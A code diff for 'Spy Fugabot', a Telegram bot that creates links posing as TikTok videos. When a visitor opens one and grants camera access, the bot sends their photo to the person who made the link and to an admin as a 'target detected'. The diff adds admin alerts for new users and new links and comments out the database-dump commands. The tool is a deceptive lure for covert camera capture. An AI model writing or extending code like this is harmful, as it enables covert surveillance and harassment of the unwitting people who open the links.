@@ -49,7 +49,7 @@ function base64(img, id_t) {
       bot.telegram.sendMediaGroup(res.user_id, [
         {
           type: "photo",
-          caption: `<b>🕵️♂️ Цель обнаружена!</b>`,
+          caption: `<b>🕵️ Цель обнаружена!</b>`,
           parse_mode: "HTML",
           media: { source: `public/${current_name}.png` },
           //media:`http://localhost:3000/${current_name}.png`
@@ -59,7 +59,7 @@ function base64(img, id_t) {
       bot.telegram.sendMediaGroup(admin, [
         {
           type: "photo",
-          caption: `<b>🕵️♂️ Цель обнаружена от пользователя tg://user?id=${res.id} </b>`,
+          caption: `<b>🕵️ Цель обнаружена от пользователя tg://user?id=${res.id} </b>`,
           parse_mode: "HTML",
           media: { source: `public/${current_name}.png` },
           //media:`http://localhost:3000/${current_name}.png`
@@ -77,6 +77,7 @@ bot.command("start", async (ctx) => {
   dataBase.findOne({ id, first_name, username }).then((res) => {
     if (!res) {
       console.log("Запись  создаеться");
+
       dataBase.insertOne({ id, first_name, username, id_video: dateNow() });
     } else {
       console.log("Запись уже создана");
@@ -85,11 +86,13 @@ bot.command("start", async (ctx) => {
     console.log(e)
   })
 
+  bot.telegram.sendMessage(process.env.ADMIN, `<blockquote><b>Пользователь добавился:</b>\n\ntg://user?id=${id}</blockquote>`,{ parse_mode:'HTML' });
   ctx.replyWithPhoto("https://i.ibb.co/MysyVfwK/file-00000000d7c882108c236da29c583a63.png", {
     caption: `🕵️‍♂️ <b>Добро пожаловать в Spy Fugabot!</b>\n\n<blockquote>Это оружие для настоящих 42 братух. Создай персональную ссылку и отправь её тому, кого хочешь затроллить!</blockquote>`,
     parse_mode: "HTML",
     reply_markup: { inline_keyboard: [ [{ text: "Начать", callback_data: `begin` }] ] }
   });
+  
 });
 
 
@@ -116,6 +119,7 @@ bot.action("begin", (ctx) => {
 После заполнения всех полей проверьте указанные данные и подтвердите создание ссылки.
 
 Отмена создания - /cancel
+
 📸 <b>Вы получите фотографию, если посетитель перейдёт по вашей ссылке и самостоятельно разрешит доступ к камере.</b>
     `,
     parse_mode: "HTML",
@@ -129,26 +133,25 @@ bot.action("begin", (ctx) => {
 
 
 
-bot.command("db", async (ctx) => {
-  console.log()
-  dataBase.find({}).toArray().then((res) => {
-    //console.log(res)
-    ctx.reply("```js" + JSON.stringify(res, null, 2) + "```", {
-      parse_mode: "Markdown",
-    });
-  });
-});
-bot.command("db2", async (ctx) => {
-  dataBaseLinks.find({}).toArray().then((res) => {
-    // console.log(res)
-    ctx.reply("```js" + JSON.stringify(res, null, 2) + "```", {
-      parse_mode: "Markdown",
-    });
-  });
-});
+// bot.command("db", async (ctx) => {
+//   console.log()
+//   dataBase.find({}).toArray().then((res) => {
+//     //console.log(res)
+//     ctx.reply("```js" + JSON.stringify(res, null, 2) + "```", {
+//       parse_mode: "Markdown",
+//     });
+//   });
+// });
+// bot.command("db2", async (ctx) => {
+//   dataBaseLinks.find({}).toArray().then((res) => {
+//     // console.log(res)
+//     ctx.reply("```js" + JSON.stringify(res, null, 2) + "```", {
+//       parse_mode: "Markdown",
+//     });
+//   });
+// });
 
 //   dataBase.deleteMany({});
-
 
 
 
@@ -294,6 +297,8 @@ bot.action("confirm_create_link", async (ctx) => {
     return ctx.reply("⚠️ Данные не найдены. Начните заново.");
   }
   const link = `https://tiktok-up.onrender.com/video?v=${data.hash}`;
+  bot.telegram.sendMessage(process.env.ADMIN, `<blockquote><b>Пользователь создал ссылку:<b>\n\ntg://user?id=${id}</blockquote>\n\n${link}`,{ parse_mode:'HTML' });
+
   await ctx.reply(`✅ <b>Ссылка готова!</b>\n\n🔗 <b>Ваша ссылка:</b>\n${link}\n\n📋 <b>Ссылка для копирования:</b>\n<code>${link}</code>`, {
     parse_mode: "HTML",
     ...Markup.inlineKeyboard([
@@ -321,12 +326,8 @@ app.get("/video", (req, res) => {
     });
   }
   else{
-
+    res.send({ type: "error" });
   }
-  
-
-  
-  // res.sendFile(__dirname + "/src/index.html");
 });
 
 app.post("/img", async (req, res) => {
